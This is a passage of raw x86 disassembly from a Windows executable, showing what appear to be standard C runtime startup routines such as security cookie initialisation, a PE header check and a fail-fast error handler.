  40468b:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  404691:	be 18 7b 41 00       	mov    $0x417b18,%esi
  404696:	8b 50 04             	mov    0x4(%eax),%edx
  404699:	eb 04                	jmp    0x40469f
  40469b:	3b d0                	cmp    %eax,%edx
  40469d:	74 10                	je     0x4046af
  40469f:	33 c0                	xor    %eax,%eax
  4046a1:	8b ca                	mov    %edx,%ecx
  4046a3:	f0 0f b1 0e          	lock cmpxchg %ecx,(%esi)
  4046a7:	85 c0                	test   %eax,%eax
  4046a9:	75 f0                	jne    0x40469b
  4046ab:	32 c0                	xor    %al,%al
  4046ad:	5e                   	pop    %esi
  4046ae:	c3                   	ret
  4046af:	b0 01                	mov    $0x1,%al
  4046b1:	5e                   	pop    %esi
  4046b2:	c3                   	ret
  4046b3:	55                   	push   %ebp
  4046b4:	8b ec                	mov    %esp,%ebp
  4046b6:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4046ba:	75 07                	jne    0x4046c3
  4046bc:	c6 05 1c 7b 41 00 01 	movb   $0x1,0x417b1c
  4046c3:	e8 ca 06 00 00       	call   0x404d92
  4046c8:	e8 3a 0a 00 00       	call   0x405107
  4046cd:	84 c0                	test   %al,%al
  4046cf:	75 04                	jne    0x4046d5
  4046d1:	32 c0                	xor    %al,%al
  4046d3:	5d                   	pop    %ebp
  4046d4:	c3                   	ret
  4046d5:	e8 16 31 00 00       	call   0x4077f0
  4046da:	84 c0                	test   %al,%al
  4046dc:	75 0a                	jne    0x4046e8
  4046de:	6a 00                	push   $0x0
  4046e0:	e8 4b 0a 00 00       	call   0x405130
  4046e5:	59                   	pop    %ecx
  4046e6:	eb e9                	jmp    0x4046d1
  4046e8:	b0 01                	mov    $0x1,%al
  4046ea:	5d                   	pop    %ebp
  4046eb:	c3                   	ret
  4046ec:	55                   	push   %ebp
  4046ed:	8b ec                	mov    %esp,%ebp
  4046ef:	83 ec 0c             	sub    $0xc,%esp
  4046f2:	80 3d 1d 7b 41 00 00 	cmpb   $0x0,0x417b1d
  4046f9:	74 04                	je     0x4046ff
  4046fb:	b0 01                	mov    $0x1,%al
  4046fd:	c9                   	leave
  4046fe:	c3                   	ret
  4046ff:	56                   	push   %esi
  404700:	8b 75 08             	mov    0x8(%ebp),%esi
  404703:	85 f6                	test   %esi,%esi
  404705:	74 05                	je     0x40470c
  404707:	83 fe 01             	cmp    $0x1,%esi
  40470a:	75 7d                	jne    0x404789
  40470c:	e8 18 08 00 00       	call   0x404f29
  404711:	85 c0                	test   %eax,%eax
  404713:	74 26                	je     0x40473b
  404715:	85 f6                	test   %esi,%esi
  404717:	75 22                	jne    0x40473b
  404719:	68 20 7b 41 00       	push   $0x417b20
  40471e:	e8 7b 2f 00 00       	call   0x40769e
  404723:	59                   	pop    %ecx
  404724:	85 c0                	test   %eax,%eax
  404726:	75 0f                	jne    0x404737
  404728:	68 2c 7b 41 00       	push   $0x417b2c
  40472d:	e8 6c 2f 00 00       	call   0x40769e
  404732:	59                   	pop    %ecx
  404733:	85 c0                	test   %eax,%eax
  404735:	74 46                	je     0x40477d
  404737:	32 c0                	xor    %al,%al
  404739:	eb 4b                	jmp    0x404786
  40473b:	a1 04 70 41 00       	mov    0x417004,%eax
  404740:	8d 75 f4             	lea    -0xc(%ebp),%esi
  404743:	57                   	push   %edi
  404744:	83 e0 1f             	and    $0x1f,%eax
  404747:	bf 20 7b 41 00       	mov    $0x417b20,%edi
  40474c:	6a 20                	push   $0x20
  40474e:	59                   	pop    %ecx
  40474f:	2b c8                	sub    %eax,%ecx
  404751:	83 c8 ff             	or     $0xffffffff,%eax
  404754:	d3 c8                	ror    %cl,%eax
  404756:	33 05 04 70 41 00    	xor    0x417004,%eax
  40475c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40475f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404762:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404765:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404766:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404767:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404768:	bf 2c 7b 41 00       	mov    $0x417b2c,%edi
  40476d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404770:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404773:	8d 75 f4             	lea    -0xc(%ebp),%esi
  404776:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404779:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40477a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40477b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40477c:	5f                   	pop    %edi
  40477d:	c6 05 1d 7b 41 00 01 	movb   $0x1,0x417b1d
  404784:	b0 01                	mov    $0x1,%al
  404786:	5e                   	pop    %esi
  404787:	c9                   	leave
  404788:	c3                   	ret
  404789:	6a 05                	push   $0x5
  40478b:	e8 41 02 00 00       	call   0x4049d1
  404790:	cc                   	int3
  404791:	6a 08                	push   $0x8
  404793:	68 50 60 41 00       	push   $0x416050
  404798:	e8 83 04 00 00       	call   0x404c20
  40479d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4047a1:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  4047a6:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  4047ad:	75 5d                	jne    0x40480c
  4047af:	a1 3c 00 40 00       	mov    0x40003c,%eax
  4047b4:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  4047bb:	45 00 00 
  4047be:	75 4c                	jne    0x40480c
  4047c0:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  4047c5:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  4047cc:	75 3e                	jne    0x40480c
  4047ce:	8b 45 08             	mov    0x8(%ebp),%eax
  4047d1:	b9 00 00 40 00       	mov    $0x400000,%ecx
  4047d6:	2b c1                	sub    %ecx,%eax
  4047d8:	50                   	push   %eax
  4047d9:	51                   	push   %ecx
  4047da:	e8 5e fe ff ff       	call   0x40463d
  4047df:	59                   	pop    %ecx
  4047e0:	59                   	pop    %ecx
  4047e1:	85 c0                	test   %eax,%eax
  4047e3:	74 27                	je     0x40480c
  4047e5:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  4047e9:	7c 21                	jl     0x40480c
  4047eb:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4047f2:	b0 01                	mov    $0x1,%al
  4047f4:	eb 1f                	jmp    0x404815
  4047f6:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4047f9:	8b 00                	mov    (%eax),%eax
  4047fb:	33 c9                	xor    %ecx,%ecx
  4047fd:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  404803:	0f 94 c1             	sete   %cl
  404806:	8b c1                	mov    %ecx,%eax
  404808:	c3                   	ret
  404809:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40480c:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404813:	32 c0                	xor    %al,%al
  404815:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404818:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40481f:	59                   	pop    %ecx
  404820:	5f                   	pop    %edi
  404821:	5e                   	pop    %esi
  404822:	5b                   	pop    %ebx
  404823:	c9                   	leave
  404824:	c3                   	ret
  404825:	55                   	push   %ebp
  404826:	8b ec                	mov    %esp,%ebp
  404828:	e8 fc 06 00 00       	call   0x404f29
  40482d:	85 c0                	test   %eax,%eax
  40482f:	74 0f                	je     0x404840
  404831:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  404835:	75 09                	jne    0x404840
  404837:	33 c0                	xor    %eax,%eax
  404839:	b9 18 7b 41 00       	mov    $0x417b18,%ecx
  40483e:	87 01                	xchg   %eax,(%ecx)
  404840:	5d                   	pop    %ebp
  404841:	c3                   	ret
  404842:	55                   	push   %ebp
  404843:	8b ec                	mov    %esp,%ebp
  404845:	80 3d 1c 7b 41 00 00 	cmpb   $0x0,0x417b1c
  40484c:	74 06                	je     0x404854
  40484e:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  404852:	75 12                	jne    0x404866
  404854:	ff 75 08             	push   0x8(%ebp)
  404857:	e8 a6 2f 00 00       	call   0x407802
  40485c:	ff 75 08             	push   0x8(%ebp)
  40485f:	e8 cc 08 00 00       	call   0x405130
  404864:	59                   	pop    %ecx
  404865:	59                   	pop    %ecx
  404866:	b0 01                	mov    $0x1,%al
  404868:	5d                   	pop    %ebp
  404869:	c3                   	ret
  40486a:	55                   	push   %ebp
  40486b:	8b ec                	mov    %esp,%ebp
  40486d:	a1 04 70 41 00       	mov    0x417004,%eax
  404872:	8b c8                	mov    %eax,%ecx
  404874:	33 05 20 7b 41 00    	xor    0x417b20,%eax
  40487a:	83 e1 1f             	and    $0x1f,%ecx
  40487d:	ff 75 08             	push   0x8(%ebp)
  404880:	d3 c8                	ror    %cl,%eax
  404882:	83 f8 ff             	cmp    $0xffffffff,%eax
  404885:	75 07                	jne    0x40488e
  404887:	e8 df 2d 00 00       	call   0x40766b
  40488c:	eb 0b                	jmp    0x404899
  40488e:	68 20 7b 41 00       	push   $0x417b20
  404893:	e8 43 2e 00 00       	call   0x4076db
  404898:	59                   	pop    %ecx
  404899:	f7 d8                	neg    %eax
  40489b:	59                   	pop    %ecx
  40489c:	1b c0                	sbb    %eax,%eax
  40489e:	f7 d0                	not    %eax
  4048a0:	23 45 08             	and    0x8(%ebp),%eax
  4048a3:	5d                   	pop    %ebp
  4048a4:	c3                   	ret
  4048a5:	55                   	push   %ebp
  4048a6:	8b ec                	mov    %esp,%ebp
  4048a8:	ff 75 08             	push   0x8(%ebp)
  4048ab:	e8 ba ff ff ff       	call   0x40486a
  4048b0:	f7 d8                	neg    %eax
  4048b2:	59                   	pop    %ecx
  4048b3:	1b c0                	sbb    %eax,%eax
  4048b5:	f7 d8                	neg    %eax
  4048b7:	48                   	dec    %eax
  4048b8:	5d                   	pop    %ebp
  4048b9:	c3                   	ret
  4048ba:	55                   	push   %ebp
  4048bb:	8b ec                	mov    %esp,%ebp
  4048bd:	83 ec 14             	sub    $0x14,%esp
  4048c0:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  4048c4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4048c7:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4048cb:	50                   	push   %eax
  4048cc:	ff 15 e0 00 41 00    	call   *0x4100e0
  4048d2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4048d5:	33 45 f4             	xor    -0xc(%ebp),%eax
  4048d8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4048db:	ff 15 dc 00 41 00    	call   *0x4100dc
  4048e1:	31 45 fc             	xor    %eax,-0x4(%ebp)
  4048e4:	ff 15 d8 00 41 00    	call   *0x4100d8
  4048ea:	31 45 fc             	xor    %eax,-0x4(%ebp)
  4048ed:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4048f0:	50                   	push   %eax
  4048f1:	ff 15 d4 00 41 00    	call   *0x4100d4
  4048f7:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4048fa:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4048fd:	33 45 ec             	xor    -0x14(%ebp),%eax
  404900:	33 45 fc             	xor    -0x4(%ebp),%eax
  404903:	33 c1                	xor    %ecx,%eax
  404905:	c9                   	leave
  404906:	c3                   	ret
  404907:	8b 0d 04 70 41 00    	mov    0x417004,%ecx
  40490d:	56                   	push   %esi
  40490e:	57                   	push   %edi
  40490f:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  404914:	be 00 00 ff ff       	mov    $0xffff0000,%esi
  404919:	3b cf                	cmp    %edi,%ecx
  40491b:	74 04                	je     0x404921
  40491d:	85 ce                	test   %ecx,%esi
  40491f:	75 26                	jne    0x404947
  404921:	e8 94 ff ff ff       	call   0x4048ba
  404926:	8b c8                	mov    %eax,%ecx
  404928:	3b cf                	cmp    %edi,%ecx
  40492a:	75 07                	jne    0x404933
  40492c:	b9 4f e6 40 bb       	mov    $0xbb40e64f,%ecx
  404931:	eb 0e                	jmp    0x404941
  404933:	85 ce                	test   %ecx,%esi
  404935:	75 0a                	jne    0x404941
  404937:	0d 11 47 00 00       	or     $0x4711,%eax
  40493c:	c1 e0 10             	shl    $0x10,%eax
  40493f:	0b c8                	or     %eax,%ecx
  404941:	89 0d 04 70 41 00    	mov    %ecx,0x417004
  404947:	f7 d1                	not    %ecx
  404949:	5f                   	pop    %edi
  40494a:	89 0d 00 70 41 00    	mov    %ecx,0x417000
  404950:	5e                   	pop    %esi
  404951:	c3                   	ret
  404952:	33 c0                	xor    %eax,%eax
  404954:	c3                   	ret
  404955:	33 c0                	xor    %eax,%eax
  404957:	40                   	inc    %eax
  404958:	c3                   	ret
  404959:	b8 00 40 00 00       	mov    $0x4000,%eax
  40495e:	c3                   	ret
  40495f:	68 38 7b 41 00       	push   $0x417b38
  404964:	ff 15 e4 00 41 00    	call   *0x4100e4
  40496a:	c3                   	ret
  40496b:	b0 01                	mov    $0x1,%al
  40496d:	c3                   	ret
  40496e:	68 00 00 03 00       	push   $0x30000
  404973:	68 00 00 01 00       	push   $0x10000
  404978:	6a 00                	push   $0x0
  40497a:	e8 95 2e 00 00       	call   0x407814
  40497f:	83 c4 0c             	add    $0xc,%esp
  404982:	85 c0                	test   %eax,%eax
  404984:	75 01                	jne    0x404987
  404986:	c3                   	ret
  404987:	6a 07                	push   $0x7
  404989:	e8 43 00 00 00       	call   0x4049d1
  40498e:	cc                   	int3
  40498f:	c3                   	ret
  404990:	b8 40 7b 41 00       	mov    $0x417b40,%eax
  404995:	c3                   	ret
  404996:	b8 48 7b 41 00       	mov    $0x417b48,%eax
  40499b:	c3                   	ret
  40499c:	e8 ef ff ff ff       	call   0x404990
  4049a1:	8b 48 04             	mov    0x4(%eax),%ecx
  4049a4:	83 08 04             	orl    $0x4,(%eax)
  4049a7:	89 48 04             	mov    %ecx,0x4(%eax)
  4049aa:	e8 e7 ff ff ff       	call   0x404996
  4049af:	8b 48 04             	mov    0x4(%eax),%ecx
  4049b2:	83 08 02             	orl    $0x2,(%eax)
  4049b5:	89 48 04             	mov    %ecx,0x4(%eax)
  4049b8:	c3                   	ret
  4049b9:	33 c0                	xor    %eax,%eax
  4049bb:	39 05 0c 70 41 00    	cmp    %eax,0x41700c
  4049c1:	0f 94 c0             	sete   %al
  4049c4:	c3                   	ret
  4049c5:	b8 08 82 41 00       	mov    $0x418208,%eax
  4049ca:	c3                   	ret
  4049cb:	b8 04 82 41 00       	mov    $0x418204,%eax
  4049d0:	c3                   	ret
  4049d1:	55                   	push   %ebp
  4049d2:	8b ec                	mov    %esp,%ebp
  4049d4:	81 ec 24 03 00 00    	sub    $0x324,%esp
  4049da:	53                   	push   %ebx
  4049db:	6a 17                	push   $0x17
  4049dd:	e8 aa 99 00 00       	call   0x40e38c
  4049e2:	85 c0                	test   %eax,%eax
  4049e4:	74 05                	je     0x4049eb
  4049e6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4049e9:	cd 29                	int    $0x29
  4049eb:	6a 03                	push   $0x3
  4049ed:	e8 bf 01 00 00       	call   0x404bb1
  4049f2:	c7 04 24 cc 02 00 00 	movl   $0x2cc,(%esp)
  4049f9:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  4049ff:	6a 00                	push   $0x0
  404a01:	50                   	push   %eax
  404a02:	e8 49 07 00 00       	call   0x405150
  404a07:	83 c4 0c             	add    $0xc,%esp
  404a0a:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  404a10:	89 8d 88 fd ff ff    	mov    %ecx,-0x278(%ebp)
  404a16:	89 95 84 fd ff ff    	mov    %edx,-0x27c(%ebp)
  404a1c:	89 9d 80 fd ff ff    	mov    %ebx,-0x280(%ebp)
  404a22:	89 b5 7c fd ff ff    	mov    %esi,-0x284(%ebp)
  404a28:	89 bd 78 fd ff ff    	mov    %edi,-0x288(%ebp)
  404a2e:	66 8c 95 a4 fd ff ff 	data16 mov %ss,-0x25c(%ebp)
  404a35:	66 8c 8d 98 fd ff ff 	data16 mov %cs,-0x268(%ebp)
  404a3c:	66 8c 9d 74 fd ff ff 	data16 mov %ds,-0x28c(%ebp)
  404a43:	66 8c 85 70 fd ff ff 	data16 mov %es,-0x290(%ebp)
  404a4a:	66 8c a5 6c fd ff ff 	data16 mov %fs,-0x294(%ebp)
  404a51:	66 8c ad 68 fd ff ff 	data16 mov %gs,-0x298(%ebp)
  404a58:	9c                   	pushf
  404a59:	8f 85 9c fd ff ff    	pop    -0x264(%ebp)
  404a5f:	8b 45 04             	mov    0x4(%ebp),%eax
  404a62:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  404a68:	8d 45 04             	lea    0x4(%ebp),%eax
  404a6b:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  404a71:	c7 85 dc fc ff ff 01 	movl   $0x10001,-0x324(%ebp)
  404a78:	00 01 00 
  404a7b:	8b 40 fc             	mov    -0x4(%eax),%eax
  404a7e:	6a 50                	push   $0x50
  404a80:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  404a86:	8d 45 a8             	lea    -0x58(%ebp),%eax
  404a89:	6a 00                	push   $0x0
  404a8b:	50                   	push   %eax
  404a8c:	e8 bf 06 00 00       	call   0x405150
  404a91:	8b 45 04             	mov    0x4(%ebp),%eax
  404a94:	83 c4 0c             	add    $0xc,%esp
  404a97:	c7 45 a8 15 00 00 40 	movl   $0x40000015,-0x58(%ebp)
  404a9e:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
